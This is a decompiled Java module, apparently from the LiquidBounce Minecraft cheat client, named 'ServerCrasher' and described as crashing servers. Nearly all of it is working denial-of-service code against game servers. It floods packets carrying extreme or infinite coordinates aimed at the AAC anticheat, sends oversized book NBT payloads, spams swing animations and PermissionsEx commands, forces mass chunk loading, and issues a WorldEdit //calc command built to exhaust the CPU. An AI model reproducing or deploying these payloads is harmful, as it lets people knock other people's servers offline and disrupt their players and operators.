/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.init.Items
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.C03PacketPlayer$C04PacketPlayerPosition
 *  net.minecraft.network.play.client.C0APacketAnimation
 *  net.minecraft.network.play.client.C17PacketCustomPayload
 */
package net.ccbluex.liquidbounce.features.module.modules.movement;

import io.netty.buffer.Unpooled;
import java.util.Random;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.MotionEvent;
import net.ccbluex.liquidbounce.event.TickEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.ListValue;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C17PacketCustomPayload;

@ModuleInfo(name="ServerCrasher", description="Allows you to crash certain server.", category=ModuleCategory.FUN)
public class ServerCrasher
extends Module {
    private final ListValue modeValue = new ListValue("Mode", new String[]{"Book", "Swing", "MassiveChunkLoading", "WorldEdit", "Pex", "CubeCraft", "AACNew", "AACOther", "AACOld"}, "Book");
    private MSTimer pexTimer = new MSTimer();

    @Override
    public void onEnable() {
        if (ServerCrasher.mc.field_71439_g == null) {
            return;
        }
        switch (((String)this.modeValue.get()).toLowerCase()) {
            case "aacnew": {
                for (int index = 0; index < 9999; ++index) {
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + (double)(9412 * index), ServerCrasher.mc.field_71439_g.func_174813_aQ().field_72338_b + (double)(9412 * index), ServerCrasher.mc.field_71439_g.field_70161_v + (double)(9412 * index), true));
                }
                break;
            }
            case "aacother": {
                for (int index = 0; index < 9999; ++index) {
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + (double)(500000 * index), ServerCrasher.mc.field_71439_g.func_174813_aQ().field_72338_b + (double)(500000 * index), ServerCrasher.mc.field_71439_g.field_70161_v + (double)(500000 * index), true));
                }
                break;
            }
            case "aacold": {
                mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                break;
            }
            case "worldedit": {
                ServerCrasher.mc.field_71439_g.func_71165_d("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            }
            case "cubecraft": {
                ServerCrasher.mc.field_71439_g.func_70107_b(ServerCrasher.mc.field_71439_g.field_70165_t, ServerCrasher.mc.field_71439_g.field_70163_u + 0.3, ServerCrasher.mc.field_71439_g.field_70161_v);
                break;
            }
            case "massivechunkloading": {
                for (double yPos = ServerCrasher.mc.field_71439_g.field_70163_u; yPos < 255.0; yPos += 5.0) {
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t, yPos, ServerCrasher.mc.field_71439_g.field_70161_v, true));
                }
                for (int i = 0; i < 6685; i += 5) {
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + (double)i, 255.0, ServerCrasher.mc.field_71439_g.field_70161_v + (double)i, true));
                }
                break;
            }
        }
    }

    @EventTarget
    public void onMotion(MotionEvent event) {
        if (event.getEventState() == EventState.POST) {
            return;
        }
        switch (((String)this.modeValue.get()).toLowerCase()) {
            case "book": {
                ItemStack bookStack = new ItemStack(Items.field_151099_bA);
                NBTTagCompound bookCompound = new NBTTagCompound();
                bookCompound.func_74778_a("author", RandomUtils.randomNumber(20));
                bookCompound.func_74778_a("title", RandomUtils.randomNumber(20));
                NBTTagList pageList = new NBTTagList();
                String pageText = RandomUtils.randomNumber(600);
                for (int page = 0; page < 50; ++page) {
                    pageList.func_74742_a((NBTBase)new NBTTagString(pageText));
                }
                bookCompound.func_74782_a("pages", (NBTBase)pageList);
                bookStack.func_77982_d(bookCompound);
                for (int packets = 0; packets < 100; ++packets) {
                    PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.func_150788_a(bookStack);
                    mc.func_147114_u().func_147297_a((Packet)new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            }
            case "cubecraft": {
                double x = ServerCrasher.mc.field_71439_g.field_70165_t;
                double y = ServerCrasher.mc.field_71439_g.field_70163_u;
                double z = ServerCrasher.mc.field_71439_g.field_70161_v;
                for (int i = 0; i < 3000; ++i) {
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false));
                    mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                }
                ServerCrasher.mc.field_71439_g.field_70181_x = 0.0;
                break;
            }
            case "pex": {
                if (!this.pexTimer.hasTimePassed(2000L)) break;
                ServerCrasher.mc.field_71439_g.func_71165_d(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                this.pexTimer.reset();
                break;
            }
            case "swing": {
                for (int i = 0; i < 5000; ++i) {
                    mc.func_147114_u().func_147297_a((Packet)new C0APacketAnimation());
                }
                break;
            }
            default: {
                this.setState(false);
            }
        }
    }

    @EventTarget
    public void onWorld(WorldEvent event) {
        if (event.getWorldClient() == null) {
            this.setState(false);
        }
    }

    @EventTarget
    public void onTick(TickEvent event) {
        if (ServerCrasher.mc.field_71439_g == null || ServerCrasher.mc.field_71441_e == null) {
            this.setState(false);
        }
    }

    @Override
    public String getTag() {
        return (String)this.modeValue.get();
    }
}

